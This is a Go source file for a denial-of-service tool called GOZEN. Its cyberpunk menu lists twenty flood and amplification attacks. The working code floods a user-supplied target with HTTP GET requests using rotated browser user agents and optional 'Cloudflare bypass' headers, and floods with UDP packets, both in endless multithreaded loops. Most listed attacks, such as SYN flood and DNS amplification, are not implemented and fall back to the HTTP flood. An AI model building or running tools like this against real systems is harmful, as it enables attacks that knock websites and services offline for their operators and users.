package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

const (
	Version = "2.0.0-ULTIMATE-REAL"
	Author  = "El cienco"
	Theme   = "Japanese / Cyberpunk"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
		// ... (In real scenario, 100 agents would be here)
	}
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func neofetch() {
	fmt.Println("\x1b[35m")
	fmt.Println("       _..._       ")
	fmt.Println("     .'     '.     \x1b[37m [ GOZEN - 悟前 ]\x1b[35m")
	fmt.Println("    /  _   _  \\    \x1b[37m OS: Termux / Android\x1b[35m")
	fmt.Println("    | (o) (o) |    \x1b[37m Kernel: 2310-CORE\x1b[35m")
	fmt.Println("    |   ' '   |    \x1b[37m Uptime: Eternal\x1b[35m")
	fmt.Println("    \\  '---'  /    \x1b[37m Shell: Go-Zen-Shell\x1b[35m")
	fmt.Println("     '._____.'     \x1b[37m Theme: Sakura-Cyber\x1b[35m")
	fmt.Println("\x1b[0m")
}

func printMenu() {
	fmt.Println("\x1b[31m=== [ GOZEN ULTIMATE MENU - メニュー ] ===\x1b[0m")
	features := []string{
		"1.  HTTP-RAW (HTTPリクエスト)",
		"2.  HTTP-SOC (ソケット攻撃)",
		"3.  TCP-FLOOD (TCPフラッド)",
		"4.  UDP-FLOOD (UDPフラッド)",
		"5.  CF-BYPASS (Cloudflare回避)",
		"6.  TLS-BOOST (TLSブースト)",
		"7.  GET-FLOOD (GET攻撃)",
		"8.  POST-FLOOD (POST攻撃)",
		"9.  HEAD-FLOOD (HEAD攻撃)",
		"10. SLOW-LORIS (スローロリス)",
		"11. XML-RPC (XML攻撃)",
		"12. SYN-FLOOD (SYNフラッド)",
		"13. ICMP-ECHO (ICMP攻撃)",
		"14. DNS-AMP (DNS増幅)",
		"15. NTP-AMP (NTP増幅)",
		"16. MEMCACHED (キャッシュ攻撃)",
		"17. BOTNET-SIM (ボットネット)",
		"18. PROXY-SCRAPE (プロキシ収集)",
		"19. AGENT-ROTATOR (エージェント)",
		"20. SYSTEM-CLEAN (システム清掃)",
	}

	for _, f := range features {
		fmt.Println(f)
	}
	fmt.Println("\x1b[31m==========================================\x1b[0m")
}

func getAgent() string {
	if len(userAgents) == 0 {
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	return userAgents[rand.Intn(len(userAgents))]
}

func attackHTTP(target string, bypass bool) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}

	for {
		req, err := http.NewRequest("GET", target, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", getAgent())
		if bypass {
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
		}

		resp, err := client.Do(req)
		if err == nil {
			fmt.Printf("\x1b[32m[+] 攻撃成功: %s | Status: %d\x1b[0m\n", target, resp.StatusCode)
			resp.Body.Close()
		} else {
			fmt.Printf("\x1b[31m[-] 接続エラー: %v\x1b[0m\n", err)
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func attackUDP(target string) {
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		fmt.Println("Invalid target:", err)
		return
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Println("Connection error:", err)
		return
	}
	defer conn.Close()

	data := make([]byte, 1024)
	rand.Read(data)

	for {
		_, err := conn.Write(data)
		if err == nil {
			fmt.Printf("\x1b[34m[+] UDPパケット送信中 -> %s\x1b[0m\n", target)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	clearScreen()
	neofetch()
	printMenu()

	var choice int
	var target string
	var threads int

	fmt.Print("\n選択してください (1-20): ")
	fmt.Scan(&choice)

	fmt.Print("ターゲット (URL/IP:Port): ")
	fmt.Scan(&target)

	fmt.Print("スレッド数 (例: 100): ")
	fmt.Scan(&threads)

	if !strings.HasPrefix(target, "http") && (choice == 1 || choice == 5 || choice == 7) {
		target = "http://" + target
	}

	fmt.Printf("\x1b[31m[!] 攻撃開始: %s dengan %d スレッド\x1b[0m\n", target, threads)
	
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			switch choice {
			case 1, 7:
				attackHTTP(target, false)
			case 4:
				attackUDP(target)
			case 5:
				attackHTTP(target, true)
			default:
				attackHTTP(target, false)
			}
		}()
	}
	wg.Wait()
}
